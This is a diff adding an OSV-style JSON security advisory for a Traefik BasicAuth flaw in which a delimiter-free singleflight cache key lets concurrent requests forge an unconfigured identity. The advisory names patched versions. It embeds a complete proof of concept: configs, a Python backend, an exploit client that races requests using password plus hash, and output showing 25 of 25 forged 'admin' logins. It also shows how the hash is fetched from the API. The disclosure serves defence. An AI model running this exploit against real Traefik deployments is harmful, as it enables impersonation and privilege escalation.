@@ -1,0 +1,63 @@
+{
+  "modified": "2026-08-03T14:22:05Z",
+  "published": "2026-08-03T14:22:05Z",
+  "schema_version": "1.5.0",
+  "id": "GHSA-6765-c87h-8mrf",
+  "details": "## Summary\n\nThere is a low severity vulnerability in Traefik's BasicAuth middleware. Concurrent password verifications are deduplicated through a singleflight group whose key was the delimiter-free concatenation of the submitted password and the stored secret, so a request carrying an unconfigured username — whose secret is empty — can produce the same key as a configured user's valid request and receive that request's successful result. Exploitation requires the attacker to already hold a valid credential **and** to read the stored password hash, which is only reachable through paths that are themselves privileged: the API is documented as admin-only, the Kubernetes path requires read access to the Secret, and the Docker path requires access to the socket. The key now encodes the password length as a prefix, so distinct (password, secret) pairs can no longer collide. Only the v3.6 line from v3.6.11 onwards and the v3.7 line are affected; earlier v3 releases and the v2 line do not carry the vulnerable deduplication path.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v3.6.25\n- https://github.com/traefik/traefik/releases/tag/v3.7.10\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n\u003cdetails\u003e\n\u003csummary\u003eOriginal Description\u003c/summary\u003e\n\n## Summary\r\n\r\nTraefik's BasicAuth middleware deduplicates concurrent password checks with a\r\n`singleflight.Group`. Its key is the delimiter-free concatenation\r\n`password + secret`. For an existing user with password `P` and stored hash\r\n`H`, the key is `P || H`. An unknown user can select the password `P || H`;\r\nbecause its secret is the empty string, its key is also `P || H`.\r\n\r\nIf the existing user's request starts the shared calculation, the unknown\r\nuser receives the existing user's successful Boolean result. Traefik then\r\ncontinues processing the unknown user's original request and propagates the\r\nattacker-selected username through `URL.User`, the access log, and the\r\nconfigured BasicAuth `headerField`.\r\n\r\nA user who knows one valid username/password/hash tuple can therefore\r\nauthenticate concurrently under any unconfigured username. This becomes a\r\nprivilege escalation when a backend uses the BasicAuth `headerField` as a\r\ntrusted identity, which is the documented purpose of that option.\r\n\r\n## Details\r\n\r\nThe vulnerable logic is in\r\n`pkg/middlewares/auth/basic_auth.go:118-131`:\r\n\r\n```go\r\nfunc (b *basicAuth) checkPassword(user, password string) bool {\r\n\tsecret := b.auth.Secrets(user, b.auth.Realm)\r\n\r\n\tkey := password + secret\r\n\tmatch, _, _ := b.singleflightGroup.Do(key, func() (any, error) {\r\n\t\tif secret == \"\" {\r\n\t\t\t_ = b.checkSecret(password, b.notFoundSecret)\r\n\t\t\treturn false, nil\r\n\t\t}\r\n\r\n\t\treturn b.checkSecret(password, secret), nil\r\n\t})\r\n\r\n\treturn match.(bool)\r\n}\r\n```\r\n\r\nFor a configured user `viewer`:\r\n\r\n```text\r\npassword = P\r\nsecret   = H\r\nkey      = P || H\r\nresult   = true\r\n```\r\n\r\nFor an unconfigured user `admin`:\r\n\r\n```text\r\npassword = P || H\r\nsecret   = \"\"\r\nkey      = (P || H) || \"\" = P || H\r\n```\r\n\r\n`singleflight.Group.Do` shares the first in-flight result for equal keys. If\r\nthe configured user's check is first, the unknown user's closure is not run\r\nand the unknown request receives `true`.\r\n\r\nThe authorization result is not bound to the username. After the shared\r\nresult is accepted, `ServeHTTP` uses the username parsed from the unknown\r\nrequest:\r\n\r\n```go\r\nreq.URL.User = url.User(user)\r\n\r\nif b.headerField != \"\" {\r\n\treq.Header.Del(b.headerField)\r\n\treq.Header[b.headerField] = []string{user}\r\n}\r\n```\r\n\r\nConsequently, the backend sees the attacker-selected `admin` identity, not\r\nthe valid request's `viewer` identity.\r\n\r\n### Attack prerequisites\r\n\r\nThe attacker needs:\r\n\r\n1. network access to a route protected by the affected BasicAuth middleware;\r\n2. one valid low-privilege username and password;\r\n3. the corresponding stored password hash.\r\n\r\nThe hash is often present in deployment labels or routing configuration.\r\nTraefik's API is also a direct source when the attacker can access it:\r\n`GET /api/http/middlewares/{id}` serializes `basicAuth.users`, including the\r\nhash, despite the field carrying `loggable:\"false\"`. The official v3.7.8\r\nbinary returned the hash in the validation environment.\r\n\r\nThe attacker does not need another user's password or a victim-generated\r\nrequest. The attacker creates both concurrent requests: one with their valid\r\ncredentials and one with an arbitrary, unconfigured target username.\r\n\r\n### Security impact\r\n\r\nWhen `headerField` is configured, an authenticated low-privilege user can\r\nimpersonate an arbitrary identity to the backend. Depending on downstream\r\nauthorization, this can allow:\r\n\r\n- access to administrative data;\r\n- execution of privileged state-changing operations;\r\n- corruption of audit attribution;\r\n- bypass of identity-based tenant or role separation.\r\n\r\nWithout `headerField`, the unknown request is still admitted through the\r\nBasicAuth middleware. The practical consequence then depends on whether the\r\nprotected route treats all authenticated users equally.\r\n\r\n## Proof of Concept\r\n\r\n### Validation environment\r\n\r\n- Official Traefik v3.7.8 Linux amd64 release.\r\n- Build timestamp: `2026-07-15T12:42:25Z`.\r\n- Go version in the release: `go1.26.5`.\r\n- Archive SHA-256:\r\n  `dbd809b1de85d86d0718c80bedbaabd9aebaa3c6697f9e986ab5f387f4196cb7`.\r\n- The checksum matched the official\r\n  `traefik_v3.7.8_checksums.txt` release asset.\r\n- No Traefik source files were modified.\r\n\r\n### Dynamic configuration\r\n\r\nThe bcrypt hash below is for password `test` and uses cost 12:\r\n\r\n```yaml\r\nhttp:\r\n  routers:\r\n    app:\r\n      entryPoints:\r\n        - web\r\n      rule: PathPrefix(`/`)\r\n      middlewares:\r\n        - auth\r\n      service: backend\r\n\r\n  middlewares:\r\n    auth:\r\n      basicAuth:\r\n        headerField: X-WebAuth-User\r\n        removeHeader: true\r\n        users:\r\n          - 'viewer:$2a$12$BSbSwtaD8dT5gywEsNtWKeZ2caIi.o6HxuKuWVx7/WNBH1YoRZ8u.'\r\n\r\n  services:\r\n    backend:\r\n      loadBalancer:\r\n        servers:\r\n          - url: http://127.0.0.1:19090\r\n```\r\n\r\nSave it as `dynamic.yml`. Use this install configuration as `static.yml`:\r\n\r\n```yaml\r\nglobal:\r\n  checkNewVersion: false\r\n  sendAnonymousUsage: false\r\n\r\napi:\r\n  insecure: true\r\n\r\nentryPoints:\r\n  web:\r\n    address: 127.0.0.1:18080\r\n\r\nproviders:\r\n  file:\r\n    filename: /absolute/path/to/dynamic.yml\r\n    watch: false\r\n```\r\n\r\nThe API is enabled only to demonstrate that the runtime representation\r\nexposes the configured hash. It is not needed if the tester already knows the\r\nhash from the configuration.\r\n\r\nUse this backend as `backend.py`; it responds with the identity Traefik puts\r\nin the trusted header:\r\n\r\n```python\r\nfrom http.server import BaseHTTPRequestHandler, ThreadingHTTPServer\r\n\r\n\r\nclass Handler(BaseHTTPRequestHandler):\r\n    def do_GET(self):\r\n        body = (self.headers.get(\"X-WebAuth-User\", \"\") + \"\\n\").encode()\r\n        self.send_response(200)\r\n        self.send_header(\"Content-Length\", str(len(body)))\r\n        self.end_headers()\r\n        self.wfile.write(body)\r\n\r\n    def log_message(self, *args):\r\n        pass\r\n\r\n\r\nThreadingHTTPServer((\"127.0.0.1\", 19090), Handler).serve_forever()\r\n```\r\n\r\nStart the backend and Traefik in separate shells.\r\n\r\nShell 1:\r\n\r\n```bash\r\npython3 backend.py\r\n```\r\n\r\nShell 2:\r\n\r\n```bash\r\n./traefik --configFile=/absolute/path/to/static.yml\r\n```\r\n\r\n### Exploit client\r\n\r\n```python\r\nimport base64\r\nimport http.client\r\nimport json\r\nimport threading\r\nimport time\r\nimport urllib.request\r\n\r\nHOST = \"127.0.0.1\"\r\nPORT = 18080\r\nPASSWORD = \"test\"\r\nHASH = \"$2a$12$BSbSwtaD8dT5gywEsNtWKeZ2caIi.o6HxuKuWVx7/WNBH1YoRZ8u.\"\r\n\r\n\r\ndef request(user, password):\r\n    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)\r\n    token = base64.b64encode(f\"{user}:{password}\".encode()).decode()\r\n    conn.request(\"GET\", \"/\", headers={\"Authorization\": f\"Basic {token}\"})\r\n    response = conn.getresponse()\r\n    body = response.read().decode().strip()\r\n    status = response.status\r\n    conn.close()\r\n    return status, body\r\n\r\n\r\nmiddleware = json.load(\r\n    urllib.request.urlopen(\r\n        \"http://127.0.0.1:8080/api/http/middlewares/auth%40file\"\r\n    )\r\n)\r\nprint(\"api_users\", middleware[\"basicAuth\"][\"users\"])\r\nprint(\"valid_baseline\", request(\"viewer\", PASSWORD))\r\nprint(\"attacker_baseline\", request(\"admin\", PASSWORD + HASH))\r\n\r\nwins = 0\r\nfor _ in range(25):\r\n    valid_result = {}\r\n    valid = threading.Thread(\r\n        target=lambda: valid_result.setdefault(\r\n            \"result\", request(\"viewer\", PASSWORD)\r\n        )\r\n    )\r\n    valid.start()\r\n    time.sleep(0.005)\r\n    attack = request(\"admin\", PASSWORD + HASH)\r\n    valid.join()\r\n    if attack == (200, \"admin\"):\r\n        wins += 1\r\n\r\nprint(\"forged_admin_successes\", wins, \"of\", 25)\r\n```\r\n\r\n### Observed output\r\n\r\n```text\r\napi_users ['viewer:$2a$12$BSbSwtaD8dT5gywEsNtWKeZ2caIi.o6HxuKuWVx7/WNBH1YoRZ8u.']\r\nvalid_baseline (200, 'viewer')\r\nattacker_baseline (401, '401 Unauthorized')\r\nforged_admin_successes 25 of 25\r\n```\r\n\r\nThe negative control proves that `admin` is not configured and cannot\r\nauthenticate alone. During the collision, all 25 requests were admitted and\r\nthe backend received the forged identity `admin`.\r\n\r\nThe same behavior was first reproduced with Apache MD5. Its much shorter hash\r\ncalculation window yielded 2 successful identity forgeries in 100 attempts.\r\nUsing normal production-strength bcrypt made the race deterministic in this\r\nenvironment because the expensive comparison remains in flight long enough\r\nfor the second request to join it.\r\n\r\n## Impact\r\n\r\nAn attacker with read access to a configured password hash and the ability to\r\nsend concurrent requests can authenticate as an unconfigured username. When\r\n`headerField` is enabled, the attacker-selected username is forwarded to the\r\nbackend as a trusted authenticated identity, enabling privilege impersonation,\r\nunauthorized data access, unauthorized actions, and incorrect security audit\r\nattribution. Without `headerField`, the request still bypasses BasicAuth and\r\nreaches the protected service.\r\n\n\n\u003c/details\u003e",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "traefik",
+        "purl": "pkg:dhi/traefik"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.6.11"
+            },
+            {
+              "fixed": "3.6.25"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "go",
+        "source_package": "Traefik"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "traefik",
+        "purl": "pkg:dhi/traefik"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.7.0"
+            },
+            {
+              "fixed": "3.7.10"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "go",
+        "source_package": "Traefik"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/security/advisories/GHSA-6765-c87h-8mrf"
+    }
+  ]
+}
